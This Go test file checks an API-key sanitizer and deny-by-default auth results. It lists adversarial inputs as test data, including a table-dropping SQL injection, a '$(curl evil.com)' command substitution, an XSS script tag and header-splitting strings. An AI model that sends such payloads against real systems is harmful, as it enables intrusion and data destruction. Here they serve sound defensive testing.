package auth

import (
	"testing"
)

// =============================================================================
// SanitizeKey tests
// =============================================================================

// SECURITY PROPERTY: API keys containing injection characters (newlines, null
// bytes, SQL metacharacters, HTTP header separators) are stripped to hex-only,
// preventing key-based injection attacks in downstream SQL or HTTP headers.
func TestSanitizeKey_InjectionCharactersStripped(t *testing.T) {
	cases := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "clean hex lowercase",
			input: "abcdef0123456789",
			want:  "abcdef0123456789",
		},
		{
			name:  "clean hex uppercase",
			input: "ABCDEF0123456789",
			want:  "ABCDEF0123456789",
		},
		{
			name:  "mixed case hex",
			input: "aAbBcCdDeEfF",
			want:  "aAbBcCdDeEfF",
		},
		{
			name:  "SQL injection attempt",
			input: "abc' OR '1'='1",
			want:  "abc11",
		},
		{
			name:  "newline injection (CRLF header splitting)",
			input: "abc\r\ndef",
			want:  "abcdef",
		},
		{
			name:  "null byte injection",
			input: "abc\x00def",
			want:  "abcdef",
		},
		{
			name:  "HTTP header value injection",
			input: "abc: evil-header\r\nX-Injected: true",
			want:  "abceeadeecede",
		},
		{
			name:  "unicode smuggling attempt",
			input: "abc\u200Bdef\uFEFF123",
			want:  "abcdef123",
		},
		{
			name:  "spaces and dashes",
			input: "abc-def 123",
			want:  "abcdef123",
		},
		{
			name:  "empty string stays empty",
			input: "",
			want:  "",
		},
		{
			name:  "no hex characters at all",
			input: "!@#$%^&*()",
			want:  "",
		},
		{
			name:  "very long input with injections",
			input: "aaaa" + string(make([]byte, 1000)) + "bbbb",
			want:  "aaaabbbb",
		},
		{
			name:  "tab characters stripped",
			input: "ab\tcd\tef",
			want:  "abcdef",
		},
		{
			name:  "non-hex letters stripped (g-z)",
			input: "abcdefghijklmnop",
			want:  "abcdef",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := SanitizeKey(tc.input)
			if got != tc.want {
				t.Errorf("SanitizeKey(%q) = %q, want %q", tc.input, got, tc.want)
			}
		})
	}
}

// SECURITY PROPERTY: SanitizeKey is idempotent — applying it twice yields the
// same result, preventing double-encoding or bypass via layered encoding.
func TestSanitizeKey_Idempotent(t *testing.T) {
	inputs := []string{
		"abc' OR 1=1--",
		"valid0123456789abcdef",
		"",
		"\x00\r\n",
		"aAbBcC",
	}
	for _, input := range inputs {
		once := SanitizeKey(input)
		twice := SanitizeKey(once)
		if once != twice {
			t.Errorf("SanitizeKey not idempotent: SanitizeKey(%q) = %q, SanitizeKey(%q) = %q",
				input, once, once, twice)
		}
	}
}

// SECURITY PROPERTY: SanitizeKey output contains ONLY hex characters, ensuring
// the output can never contain control characters, delimiters, or SQL syntax.
func TestSanitizeKey_OutputIsHexOnly(t *testing.T) {
	// Fuzz-like test with adversarial inputs
	adversarial := []string{
		"'; DROP TABLE context_api_keys;--",
		"$(curl evil.com)",
		"{{template}}",
		"<script>alert(1)</script>",
		"%00%0d%0a",
		"\xff\xfe",
	}
	for _, input := range adversarial {
		got := SanitizeKey(input)
		for i, c := range got {
			if (c < '0' || c > '9') && (c < 'a' || c > 'f') && (c < 'A' || c > 'F') {
				t.Errorf("SanitizeKey(%q) contains non-hex char %q at index %d", input, string(c), i)
			}
		}
	}
}

// =============================================================================
// AuthResult tests
// =============================================================================

// SECURITY PROPERTY: A default AuthResult (zero value) must have IsValid=false,
// ensuring that uninitialized auth state defaults to deny.
func TestAuthResult_ZeroValueIsDeny(t *testing.T) {
	var ar AuthResult
	if ar.IsValid {
		t.Fatal("zero-value AuthResult.IsValid should be false (deny by default)")
	}
	if ar.ApiKeyID != "" {
		t.Fatal("zero-value AuthResult.ApiKeyID should be empty")
	}
	if ar.HomeScope != "" {
		t.Fatal("zero-value AuthResult.HomeScope should be empty")
	}
	if ar.AllowedScopes != nil {
		t.Fatal("zero-value AuthResult.AllowedScopes should be nil")
	}
	if ar.ReadScopes != nil {
		t.Fatal("zero-value AuthResult.ReadScopes should be nil")
	}
}

// SECURITY PROPERTY: A pointer to AuthResult also defaults to deny, verifying
// that the constructor used in Authenticate() returns deny on invalid keys.
func TestAuthResult_NewPointerIsDeny(t *testing.T) {
	ar := &AuthResult{IsValid: false}
	if ar.IsValid {
		t.Fatal("explicitly-constructed deny AuthResult should not be valid")
	}
}

// NOTE: Authenticate() requires a live *pgxpool.Pool connected to PostgreSQL
// with the ctx_auth function deployed. It cannot be unit-tested without a
// database. The following properties SHOULD be verified via integration tests:
//
//   - Empty API key returns IsValid=false without hitting the DB
//   - Invalid/unknown key returns IsValid=false
//   - Valid key returns correct HomeScope, AllowedScopes, ReadScopes
//   - Scope isolation: a "work" key cannot see "private" blocks
//   - SQL injection in key parameter is neutralized by parameterized query
//   - Concurrent Authenticate calls are safe (pgxpool handles this)
